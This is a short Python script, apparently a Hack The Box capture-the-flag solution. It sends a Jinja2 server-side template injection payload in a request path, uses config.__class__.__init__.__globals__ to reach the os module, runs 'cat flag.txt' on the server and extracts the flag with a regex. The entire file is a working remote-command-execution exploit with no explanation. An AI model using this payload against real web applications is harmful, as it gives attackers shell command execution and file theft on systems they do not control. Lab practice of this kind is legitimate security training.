#!/usr/bin/python3

import requests
import re

url = "http://138.68.182.108:30835/{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}"


r = requests.get(url)

print(re.findall("HTB{.*", r.text)[0])
